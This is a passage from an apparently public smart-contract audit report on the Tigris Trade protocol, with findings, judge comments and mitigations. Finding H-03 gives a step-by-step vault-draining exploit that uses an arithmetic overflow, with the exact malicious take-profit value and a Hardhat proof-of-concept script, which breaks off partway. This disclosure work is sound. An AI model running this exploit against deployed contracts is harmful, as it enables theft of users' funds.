 </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">daiAtEnd</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mockDAI</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tenPow18</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;1000000000000000000&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">diff</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">daiAtEnd</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">daiAtBeginning</span><span class=\"mtk1\">).</span><span class=\"mtk11\">toString</span><span class=\"mtk1\">() / </span><span class=\"mtk12\">tenPow18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">`Profit: </span><span class=\"mtk4\">${</span><span class=\"mtk12\">diff</span><span class=\"mtk4\">}</span><span class=\"mtk8\"> DAI`</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">})</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/67\">GainsGoblin (Tigris Trade) confirmed</a></strong> </p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/67#issuecomment-1383681527\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown how, through the combination of: finding a way to re-trigger the delayCheck, altering SL and TP prices, a trader can prevent their position from being closed, creating the opportunity for riskless trades.</p>\n<p>Because of the broken invariants, and the value extraction shown, I agree with High Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/67#issuecomment-1407130700\">GainsGoblin (Tigris Trade) resolved</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173125\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173125</a> </p>\n</blockquote>\n<hr>\n<h2 id=\"h-03-certain-fee-configuration-enables-vaults-to-be-drained\" style=\"position:relative;\"><a href=\"#h-03-certain-fee-configuration-enables-vaults-to-be-drained\" aria-label=\"h 03 certain fee configuration enables vaults to be drained permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/86\">[H-03] Certain fee configuration enables vaults to be drained</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/86\">Bobface</a></em></p>\n<p>An overflow in <code>TradingLibrary.pnl()</code> enables all funds from the vault contracts to be drained given a certain fee configuration is present.</p>\n<h3 id=\"detailed-exploit-process-description\" style=\"position:relative;\"><a href=\"#detailed-exploit-process-description\" aria-label=\"detailed exploit process description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Detailed exploit process description</h3>\n<p>When opening a position, any value can be passed as take-profit price. This value is later used in the PNL calculation in an <code>unchecked</code> block. Setting this value specifically to attack the vault leads to the <code>Trading</code> contract minting a huge (in the example below <code>10^36</code>) Tigris tokens, which can then be given to the vault to withdraw assets.</p>\n<p>The exploiter starts by setting himself as referrer, in order to later receive the referrer fees.</p>\n<p>The next step is to open a short position at the current market price by calling <code>initiateLimitOrder()</code>. Here, the malicious value which will later bring the arithmetic to overflow is passed in as take-profit price. For the example below, the value has been calculated by hand to be <code>115792089237316195423570985008687907854269984665640564039467</code> for this specific market price, leverage and margin.</p>\n<p>The order is then immediately executed through <code>executeLimitOrder()</code>.</p>\n<p>The final step is to close the order through <code>limitClose()</code>, which will then mint over <code>10^36</code> Tigris tokens to the attacker.</p>\n<h3 id=\"detailed-bug-description\" style=\"position:relative;\"><a href=\"#detailed-bug-description\" aria-label=\"detailed bug description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Detailed bug description</h3>\n<p>The bug takes place in <code>TradingLibrary.pnl()</code>, line 46. The function is called during the process of closing the order to calculate the payout and position size. The malicious take-profit is passed as <code>_currentPrice</code> and the order’s original opening price is passed as <code>_price</code>. The take-profit has been specifically calculated so that <code>1e18 * _currentPrice / _price - 1e18</code> results in <code>0</code>, meaning <code>_payout = _margin</code> (<code>accInterest</code> is negligible for this PoC).\nLine 48 then calculates the position size. Margin and leverage have been chosen so that <code>_initPositionSize * _currentPrice</code> does not overflow, resulting in a huge <code>_positionSize</code> which is returned from the function.</p>\n<p>Later, <code>Trading._handleCloseFees()</code> is called, under the condition that <code>_payout > 0</code>, which is why the overflow had to be calculated so precisely, as to not subtract from the <code>_payout</code> but still create a large <code>_positionSize</code>. <code>_positionSize</code> is passed in to this function, and it is used to calculate DAO and referral fees. Line 805 is what requires the specific fee configuration to be present, as otherwise this line would revert. The fees have to be <code>daoFees = 2*referralFees</code> — not exactly, but close to this relationship. Then line 792 will set the DAO fees close to zero, while the huge <code>referralFees</code> are directly minted and not included in the calculation in line 805.</p>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The core issue is that the arithmetic in <code>TradingLibrary.pnl()</code> overflows. I recommend removing the <code>unchecked</code> block.</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Insert the following code as test into <code>test/07.Trading.js</code> and run it with <code>npx hardhat test test/07.Trading.js</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">describe</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;PoC&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">it</span><span class=\"mtk1\">.</span><span class=\"mtk11\">only</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;PoC&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Setup token balances and approvals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mockDAI</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractAt</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MockERC20&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MockDAI</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mockDAI</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;10000&quot;</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mockDAI</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">trading</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;10000&quot;</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">permitData</span><span class=\"mtk1\"> = [</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">false</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Create referral code</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">referrals</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">createReferralCode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">constants</span><span class=\"mtk1\">.</span><span class=\"mtk12\">HashZero</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Set the fees</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">trading</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">setFees</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">false</span><span class=\"mtk1\">,        </span><span class=\"mtk3\">// close</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;200000000&quot;</span><span class=\"mtk1\">,  </span><span class=\"mtk3\">// dao  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\">,          </span><span class=\"mtk3\">// burn</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;100000000&quot;</span><span class=\"mtk1\">,  </span><span class=\"mtk3\">// referral</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\">,          </span><span class=\"mtk3\">// bot</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\">,          </span><span class=\"mtk3\">// percent</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// ============================================================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// =================== Create the limit order =================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// ============================================================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tradeInfo</span><span class=\"mtk1\"> = [</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;1&quot;</span><span class=\"mtk1\">),          </span><span class=\"mtk3\">// margin amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">MockDAI</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,          </span><span class=\"mtk3\">// margin asset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">StableVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,      </span><span class=\"mtk3\">// stable vault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;2&quot;</span><span class=\"mtk1\">),          </span><span class=\"mtk3\">// leverage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,                        </span><span class=\"mtk3\">// asset id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">false</span><span class=\"mtk1\">,                    </span><span class=\"mtk3\">// direction (short)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;115792089237316195423570985008687907854269984665640564039467&quot;</span><span class=\"mtk1\">,          </span><span class=\"mtk3\">// take profit price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\">),       </span><span class=\"mtk3\">// stop loss price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">constants</span><span class=\"mtk1\">.</span><span class=\"mtk12\">HashZero</span><span class=\"mtk1\"> </span><span class=\"mtk3\">// referral (ourself)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Create the order</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">trading</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">initiateLimitOrder</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tradeInfo</span><span class=\"mtk1\">,            </span><span class=\"mtk3\">// trade info</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,                    </span><span class=\"mtk3\">// order type (limit)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;1000&quot;</span><span class=\"mtk1\">),   </span><span class=\"mtk3\">// price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">permitData</span><span class=\"mtk1\">,           </span><span class=\"mtk3\">// permit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">          </span><span class=\"mtk3\">// trader</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// ============================================================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// =================== Execute the limit order ================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// ============================================================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Wait for some blocks to pass the delay</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_increaseTime&quot;</span><span class=\"mtk1\">, [</span><span class=\"mtk7\">10</span><span class=\"mtk1\">])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_mine&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Create the price data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\"> = [</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">node</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,                                   </span><span class=\"mtk3\">// provider</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,                                              </span><span class=\"mtk3\">// asset id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;1000&quot;</span><span class=\"mtk1\">),                             </span><span class=\"mtk3\">// price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">10000000</span><span class=\"mtk1\">,                                       </span><span class=\"mtk3\">// spread (0.1%)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBlock</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">,   </span><span class=\"mtk3\">// timestamp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">false</span><span class=\"mtk1\">                                           </span><span class=\"mtk3\">// is closed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Sign the price data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">message</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk12\">defaultAbiCoder</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          [</span><span class=\"mtk8\">&#39;address&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;bool&#39;</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          [</span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">], </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">], </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">], </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">3</span><span class=\"mtk1\">], </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">4</span><span class=\"mtk1\">], </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">5</span><span class=\"mtk1\">]]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sig</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">node</span><span class=\"mtk1\">.</span><span class=\"mtk11\">signMessage</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">Buffer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">from</span><span class=\"mtk1\">(</span><span class=\"mtk12\">message</span><span class=\"mtk1\">.</span><span class=\"mtk11\">substring</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&#39;hex&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      